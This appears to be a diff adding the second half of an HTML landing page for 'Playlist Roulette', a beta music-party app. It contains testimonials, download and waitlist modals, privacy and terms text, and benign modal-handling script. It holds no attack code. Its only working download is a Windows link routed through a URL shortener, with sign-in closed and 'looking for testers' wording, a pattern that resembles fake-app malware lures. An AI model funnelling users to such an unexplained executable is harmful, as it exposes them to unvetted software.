+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+          <svg class="w-4 h-4 fill-yellow-400" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        </div>
+        <p class="text-white/80 leading-relaxed text-sm flex-1 mb-6">"The fact that Spotify and YouTube both work in the same room is the killer feature. Everyone's library shows up."</p>
+        <div class="flex items-center gap-3">
+          <div class="avatar">J</div>
+          <div><p class="font-semibold text-sm">Jules B.</p><p class="text-xs text-white/40">Beta tester · Lyon</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ CTA ═══════════════════════════════ -->
+<section class="py-24 sm:py-32">
+  <div class="max-w-5xl mx-auto px-5">
+    <div class="relative overflow-hidden rounded-3xl border border-white/10 p-10 sm:p-16 text-center" style="background:linear-gradient(135deg,rgba(217,70,239,.18) 0%,rgba(124,58,237,.14) 50%,rgba(34,197,94,.10) 100%)">
+      <!-- Glow orbs -->
+      <div class="absolute -top-20 -left-20 w-64 h-64 rounded-full bg-fuchsia-500/20 blur-3xl pointer-events-none"></div>
+      <div class="absolute -bottom-20 -right-20 w-64 h-64 rounded-full bg-violet-500/20 blur-3xl pointer-events-none"></div>
+      <div class="relative">
+        <div class="mx-auto mb-6" style="width:4rem;height:4rem;filter:drop-shadow(0 0 20px rgba(217,70,239,.7))">
+          <svg width="64" height="64" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <radialGradient id="vinylBg2" cx="50%" cy="40%" r="55%"><stop offset="0%" stop-color="#9333ea"/><stop offset="60%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient>
+              <radialGradient id="vinylGlow2" cx="50%" cy="50%" r="50%"><stop offset="70%" stop-color="transparent"/><stop offset="100%" stop-color="#d946ef" stop-opacity=".8"/></radialGradient>
+              <radialGradient id="noteGrad2" cx="40%" cy="30%" r="70%"><stop offset="0%" stop-color="#ffffff"/><stop offset="100%" stop-color="#e9d5ff"/></radialGradient>
+              <filter id="glow2"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+            </defs>
+            <circle cx="50" cy="50" r="48" fill="none" stroke="#d946ef" stroke-width="1.5" stroke-opacity=".7"/>
+            <circle cx="50" cy="50" r="46" fill="none" stroke="#f0abfc" stroke-width=".5" stroke-opacity=".4"/>
+            <circle cx="50" cy="50" r="45" fill="url(#vinylBg2)"/>
+            <circle cx="50" cy="50" r="40" fill="none" stroke="rgba(255,255,255,.08)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="35" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="30" fill="none" stroke="rgba(255,255,255,.06)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="25" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="20" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="15" fill="none" stroke="rgba(255,255,255,.04)" stroke-width="1"/>
+            <circle cx="50" cy="50" r="45" fill="url(#vinylGlow2)"/>
+            <g filter="url(#glow2)">
+              <ellipse cx="44" cy="62" rx="10" ry="8" fill="url(#noteGrad2)"/>
+              <ellipse cx="44" cy="62" rx="4" ry="3.5" fill="#4c1d95"/>
+              <rect x="53" y="30" width="5" height="33" rx="2.5" fill="url(#noteGrad2)"/>
+              <path d="M58 30 Q75 36 70 50 Q65 42 58 42 Z" fill="url(#noteGrad2)"/>
+            </g>
+          </svg>
+        </div>
+        <h2 class="font-display text-4xl sm:text-5xl font-extrabold tracking-tight mb-4">Ready for the next party?</h2>
+        <p class="text-white/65 max-w-xl mx-auto mb-8 text-lg leading-relaxed">Get the desktop app, or jump into the web beta in two clicks. No account needed for room hosts.</p>
+        <div class="flex flex-col sm:flex-row gap-3 justify-center">
+          <button onclick="openDownloadModal()" class="btn btn-lg btn-success">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            Download for Free
+          </button>
+          <button onclick="openAuthModal()" class="btn btn-lg btn-bordered">Join the web beta</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ FOOTER ═══════════════════════════════ -->
+<footer class="border-t border-white/5 py-12">
+  <div class="max-w-7xl mx-auto px-5">
+    <div class="flex flex-col md:flex-row gap-6 items-start md:items-center justify-between">
+      <div>
+        <div class="flex items-center gap-2.5 mb-2">
+          <div style="width:2rem;height:2rem;filter:drop-shadow(0 0 6px rgba(217,70,239,.5));flex-shrink:0">
+            <svg width="32" height="32" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <radialGradient id="vinylBgF" cx="50%" cy="40%" r="55%"><stop offset="0%" stop-color="#9333ea"/><stop offset="60%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient>
+                <radialGradient id="vinylGlowF" cx="50%" cy="50%" r="50%"><stop offset="70%" stop-color="transparent"/><stop offset="100%" stop-color="#d946ef" stop-opacity=".8"/></radialGradient>
+                <radialGradient id="noteGradF" cx="40%" cy="30%" r="70%"><stop offset="0%" stop-color="#ffffff"/><stop offset="100%" stop-color="#e9d5ff"/></radialGradient>
+              </defs>
+              <circle cx="50" cy="50" r="48" fill="none" stroke="#d946ef" stroke-width="2" stroke-opacity=".6"/>
+              <circle cx="50" cy="50" r="45" fill="url(#vinylBgF)"/>
+              <circle cx="50" cy="50" r="38" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="1.5"/>
+              <circle cx="50" cy="50" r="28" fill="none" stroke="rgba(255,255,255,.06)" stroke-width="1.5"/>
+              <circle cx="50" cy="50" r="18" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1.5"/>
+              <circle cx="50" cy="50" r="45" fill="url(#vinylGlowF)"/>
+              <ellipse cx="44" cy="62" rx="10" ry="8" fill="url(#noteGradF)"/>
+              <ellipse cx="44" cy="62" rx="4" ry="3.5" fill="#4c1d95"/>
+              <rect x="53" y="30" width="5" height="33" rx="2.5" fill="url(#noteGradF)"/>
+              <path d="M58 30 Q75 36 70 50 Q65 42 58 42 Z" fill="url(#noteGradF)"/>
+            </svg>
+          </div>
+          <span class="font-display font-extrabold text-lg">Playlist Roulette</span>
+          <span class="chip chip-success">Beta</span>
+        </div>
+        <p class="text-sm text-white/40">Beta version — Looking for testers. Built with care for music friends everywhere.</p>
+      </div>
+      <div class="flex items-center gap-2">
+        <a href="#" class="btn btn-sm btn-flat">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+          Contact
+        </a>
+        <a href="https://github.com/playlistroulette" target="_blank" rel="noreferrer" class="btn btn-sm btn-flat">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg>
+          GitHub
+        </a>
+      </div>
+    </div>
+    <div class="divider my-8"></div>
+    <div class="flex flex-col md:flex-row gap-3 justify-between text-xs text-white/35">
+      <p>© <span id="year"></span> Playlist Roulette. All rights reserved.</p>
+      <div class="flex gap-5">
+        <a href="#" onclick="openLegalModal('privacy');return false;" class="hover:text-white/70 transition">Privacy</a>
+        <a href="#" onclick="openLegalModal('terms');return false;" class="hover:text-white/70 transition">Terms</a>
+        <a href="#" onclick="openDownloadModal();return false;" class="hover:text-white/70 transition">Get the app</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- ═══════════════════════════════ DOWNLOAD MODAL ═══════════════════════════════ -->
+<div id="download-modal" class="modal-backdrop" onclick="handleBdClick(event,'download-modal')">
+  <div class="modal-box" style="max-width:26rem" onclick="event.stopPropagation()">
+    <!-- Header -->
+    <div class="px-6 pt-6 pb-5 border-b border-white/6 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <div style="width:2.5rem;height:2.5rem;flex-shrink:0;filter:drop-shadow(0 0 8px rgba(217,70,239,.5))">
+          <svg width="40" height="40" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <radialGradient id="vinylBgD" cx="50%" cy="40%" r="55%"><stop offset="0%" stop-color="#9333ea"/><stop offset="60%" stop-color="#7c3aed"/><stop offset="100%" stop-color="#4c1d95"/></radialGradient>
+              <radialGradient id="vinylGlowD" cx="50%" cy="50%" r="50%"><stop offset="70%" stop-color="transparent"/><stop offset="100%" stop-color="#d946ef" stop-opacity=".8"/></radialGradient>
+              <radialGradient id="noteGradD" cx="40%" cy="30%" r="70%"><stop offset="0%" stop-color="#ffffff"/><stop offset="100%" stop-color="#e9d5ff"/></radialGradient>
+            </defs>
+            <circle cx="50" cy="50" r="48" fill="none" stroke="#d946ef" stroke-width="2" stroke-opacity=".6"/>
+            <circle cx="50" cy="50" r="45" fill="url(#vinylBgD)"/>
+            <circle cx="50" cy="50" r="38" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="1.5"/>
+            <circle cx="50" cy="50" r="28" fill="none" stroke="rgba(255,255,255,.06)" stroke-width="1.5"/>
+            <circle cx="50" cy="50" r="18" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1.5"/>
+            <circle cx="50" cy="50" r="45" fill="url(#vinylGlowD)"/>
+            <ellipse cx="44" cy="62" rx="10" ry="8" fill="url(#noteGradD)"/>
+            <ellipse cx="44" cy="62" rx="4" ry="3.5" fill="#4c1d95"/>
+            <rect x="53" y="30" width="5" height="33" rx="2.5" fill="url(#noteGradD)"/>
+            <path d="M58 30 Q75 36 70 50 Q65 42 58 42 Z" fill="url(#noteGradD)"/>
+          </svg>
+        </div>
+        <div>
+          <p class="font-display font-bold text-base">Download Playlist Roulette</p>
+          <p class="text-xs text-white/40">Free · No account required</p>
+        </div>
+      </div>
+      <button onclick="closeModal('download-modal')" class="btn btn-sm btn-ghost w-8 h-8 p-0 rounded-lg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <!-- Options -->
+    <div class="p-5 flex flex-col gap-3">
+      <a href="https://playlistroulette.short.gy/download" class="dl-option">
+        <div class="dl-icon bg-blue-500/15 border border-blue-500/20">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="#60a5fa"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-sm">Windows</p>
+          <p class="text-xs text-white/40">Windows 10 / 11 · 64-bit</p>
+        </div>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white/30"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      </a>
+      <a href="https://playlistroulette.github.io/download/mac" class="dl-option" style="opacity:.55;pointer-events:none;cursor:not-allowed">
+        <div class="dl-icon bg-white/8 border border-white/10">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="rgba(255,255,255,.5)"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-sm text-white/50">macOS</p>
+          <p class="text-xs text-white/30">Coming soon</p>
+        </div>
+        <span class="chip chip-warning text-xs">Soon</span>
+      </a>
+      <a href="https://playlistroulette.github.io/download/linux" class="dl-option" style="opacity:.55;pointer-events:none;cursor:not-allowed">
+        <div class="dl-icon bg-white/8 border border-white/10">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="rgba(255,255,255,.5)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-sm text-white/50">Linux</p>
+          <p class="text-xs text-white/30">Coming soon</p>
+        </div>
+        <span class="chip chip-warning text-xs">Soon</span>
+      </a>
+      <div class="divider"></div>
+      <button onclick="closeModal('download-modal');openAuthModal()" class="dl-option" style="border-style:dashed">
+        <div class="dl-icon bg-fuchsia-500/10 border border-fuchsia-500/20">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#e879f9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-sm">Web Beta</p>
+          <p class="text-xs text-white/40">No install needed · Join waitlist</p>
+        </div>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white/30"><polyline points="9 18 15 12 9 6"/></svg>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ AUTH MODAL ═══════════════════════════════ -->
+<div id="auth-modal" class="modal-backdrop" onclick="handleBdClick(event,'auth-modal')">
+  <div class="modal-box" style="max-width:26rem" onclick="event.stopPropagation()">
+    <div class="px-6 pt-6 pb-5 border-b border-white/6 flex items-center justify-between">
+      <div>
+        <p class="font-display font-bold text-base">Sign in to Playlist Roulette</p>
+        <p class="text-xs text-white/40 mt-0.5">Account features are still in private beta.</p>
+      </div>
+      <button onclick="closeModal('auth-modal')" class="btn btn-sm btn-ghost w-8 h-8 p-0 rounded-lg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="px-6 py-5 flex flex-col gap-4">
+      <div class="tab-list">
+        <button class="tab-item active" id="tab-signin" onclick="switchTab('signin')">Sign in</button>
+        <button class="tab-item" id="tab-register" onclick="switchTab('register')">Register</button>
+      </div>
+      <div class="rounded-xl px-4 py-3 text-sm" style="background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.2);color:#fde68a">
+        Sign in and registration are <strong>currently closed</strong> while we finish the beta. Drop your email and we'll let you in as soon as a slot opens.
+      </div>
+      <div id="email-section">
+        <label class="block text-xs text-white/45 mb-1.5 font-medium">Email address</label>
+        <input id="modal-email" type="email" class="input-field" placeholder="you@example.com" oninput="checkEmail()" onkeydown="if(event.key==='Enter')handleModalSubmit()" />
+        <p id="email-error" class="text-xs mt-1.5" style="color:#f87171;display:none">Please enter a valid email address.</p>
+      </div>
+      <div id="success-section" class="hidden rounded-xl px-4 py-4 text-sm" style="background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#86efac">
+        You're on the list. We'll email <strong id="confirmed-email"></strong> the moment the beta opens up.
+      </div>
+    </div>
+    <div class="px-6 pb-6 flex justify-end gap-2">
+      <button class="btn btn-sm btn-flat" onclick="closeModal('auth-modal')">Close</button>
+      <button id="modal-submit" class="btn btn-sm btn-primary" onclick="handleModalSubmit()" disabled>Join the waitlist</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ LEGAL MODAL ═══════════════════════════════ -->
+<div id="legal-modal" class="modal-backdrop" onclick="handleBdClick(event,'legal-modal')">
+  <div class="modal-box" style="max-width:36rem;max-height:85vh;display:flex;flex-direction:column" onclick="event.stopPropagation()">
+    <div class="px-6 pt-6 pb-4 border-b border-white/6 flex items-center justify-between flex-shrink-0">
+      <p id="legal-title" class="font-display font-bold text-base"></p>
+      <button onclick="closeModal('legal-modal')" class="btn btn-sm btn-ghost w-8 h-8 p-0 rounded-lg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div id="legal-body" class="px-6 py-5 overflow-y-auto text-sm text-white/60 leading-relaxed flex-1" style="scrollbar-width:thin"></div>
+    <div class="px-6 pb-5 pt-3 border-t border-white/5 flex-shrink-0">
+      <button class="btn btn-sm btn-flat w-full" onclick="closeModal('legal-modal')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ LIGHTBOX ═══════════════════════════════ -->
+<div id="lightbox" onclick="closeLightbox()">
+  <button onclick="closeLightbox()" style="position:absolute;top:1.25rem;right:1.25rem;background:rgba(255,255,255,.1);border:none;border-radius:9999px;width:2.5rem;height:2.5rem;display:flex;align-items:center;justify-content:center;cursor:pointer;color:white;backdrop-filter:blur(8px)">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+  </button>
+  <img id="lightbox-img" src="" alt="Screenshot" onclick="event.stopPropagation()" />
+</div>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+
+  function openDownloadModal() {
+    document.getElementById('download-modal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function openAuthModal() {
+    document.getElementById('auth-modal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeModal(id) {
+    document.getElementById(id).classList.remove('open');
+    document.body.style.overflow = '';
+    if (id === 'auth-modal') {
+      document.getElementById('modal-email').value = '';
+      document.getElementById('email-section').classList.remove('hidden');
+      document.getElementById('success-section').classList.add('hidden');
+      document.getElementById('modal-submit').textContent = 'Join the waitlist';
+      document.getElementById('modal-submit').disabled = true;
+      switchTab('signin');
+    }
+  }
+  function handleBdClick(e, id) {
+    if (e.target === document.getElementById(id)) closeModal(id);
+  }
+  function switchTab(tab) {
+    document.getElementById('tab-signin').classList.toggle('active', tab === 'signin');
+    document.getElementById('tab-register').classList.toggle('active', tab === 'register');
+  }
+  function checkEmail() {
+    const val = document.getElementById('modal-email').value.trim();
+    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val);
+    const btn = document.getElementById('modal-submit');
+    const errEl = document.getElementById('email-error');
+    btn.disabled = !valid;
+    if (errEl) errEl.style.display = val.length > 0 && !valid ? 'block' : 'none';
+  }
+  function handleModalSubmit() {
+    const btn = document.getElementById('modal-submit');
+    if (btn.textContent === 'Done') { closeModal('auth-modal'); return; }
+    const email = document.getElementById('modal-email').value.trim();
+    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
+    if (!email || !valid) return;
+    document.getElementById('confirmed-email').textContent = email;
+    document.getElementById('email-section').classList.add('hidden');
+    document.getElementById('success-section').classList.remove('hidden');
+    btn.textContent = 'Done';
+    btn.disabled = false;
+  }
+  function openLightbox(src) {
+    document.getElementById('lightbox-img').src = src;
+    document.getElementById('lightbox').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeLightbox() {
+    document.getElementById('lightbox').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') {
+      closeModal('download-modal');
+      closeModal('auth-modal');
+      closeModal('legal-modal');
+      closeLightbox();
+    }
+  });
+
+  const legalContent = {
+    privacy: {
+      title: 'Privacy Policy',
+      body: `
+        <p class="text-white/40 text-xs mb-4">Last updated: April 2026</p>
+        <p class="mb-4">Playlist Roulette ("we", "us") is currently in beta. This policy explains how we handle your data.</p>
+        <p class="font-semibold text-white/80 mb-2">1. Data we collect</p>
+        <p class="mb-4">We only collect your email address if you voluntarily join the waitlist. We do not collect any other personal data without your consent.</p>
+        <p class="font-semibold text-white/80 mb-2">2. How we use your email</p>
+        <p class="mb-4">Your email is used solely to notify you when beta access opens. We will never sell, share, or use it for marketing without your explicit consent.</p>
+        <p class="font-semibold text-white/80 mb-2">3. Cookies</p>
+        <p class="mb-4">We do not use tracking cookies. The app may use local storage to remember your session preferences.</p>
+        <p class="font-semibold text-white/80 mb-2">4. Third-party services</p>
+        <p class="mb-4">Playlist Roulette embeds Spotify and YouTube players. These services have their own privacy policies and may collect data independently.</p>
+        <p class="font-semibold text-white/80 mb-2">5. Data retention</p>
+        <p class="mb-4">Waitlist emails are deleted once the beta period ends or upon your request. Send a deletion request to <a href="mailto:hello@playlistroulette.github.io" class="text-fuchsia-400 hover:underline">hello@playlistroulette.github.io</a>.</p>
+        <p class="font-semibold text-white/80 mb-2">6. Contact</p>
+        <p>For any privacy concerns, contact us at <a href="mailto:hello@playlistroulette.github.io" class="text-fuchsia-400 hover:underline">hello@playlistroulette.github.io</a>.</p>
+      `
+    },
+    terms: {
+      title: 'Terms of Service',
+      body: `
+        <p class="text-white/40 text-xs mb-4">Last updated: April 2026</p>
+        <p class="mb-4">By using Playlist Roulette you agree to these terms. The service is currently in beta and provided "as is".</p>
+        <p class="font-semibold text-white/80 mb-2">1. Beta disclaimer</p>
+        <p class="mb-4">Playlist Roulette is in active development. Features may change, break, or be removed at any time without notice.</p>
+        <p class="font-semibold text-white/80 mb-2">2. Acceptable use</p>
+        <p class="mb-4">You agree not to use the service to share illegal, harmful, or copyrighted content. You are responsible for the music links you submit.</p>
+        <p class="font-semibold text-white/80 mb-2">3. Intellectual property</p>
+        <p class="mb-4">Playlist Roulette does not host any music. All audio is streamed directly from Spotify or YouTube via their official embed APIs. All rights remain with the respective rights holders.</p>
+        <p class="font-semibold text-white/80 mb-2">4. Limitation of liability</p>
+        <p class="mb-4">We are not liable for any damages arising from use of the service during the beta period. Use at your own risk.</p>
+        <p class="font-semibold text-white/80 mb-2">5. Changes to terms</p>
+        <p class="mb-4">We may update these terms at any time. Continued use of the service constitutes acceptance of the updated terms.</p>
+        <p class="font-semibold text-white/80 mb-2">6. Contact</p>
+        <p>Questions? Reach us at <a href="mailto:hello@playlistroulette.github.io" class="text-fuchsia-400 hover:underline">hello@playlistroulette.github.io</a>.</p>
+      `
+    }
+  };
+
+  function openLegalModal(type) {
+    const content = legalContent[type];
+    document.getElementById('legal-title').textContent = content.title;
+    document.getElementById('legal-body').innerHTML = content.body;
+    document.getElementById('legal-modal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+</script>
+</body>
+</html>
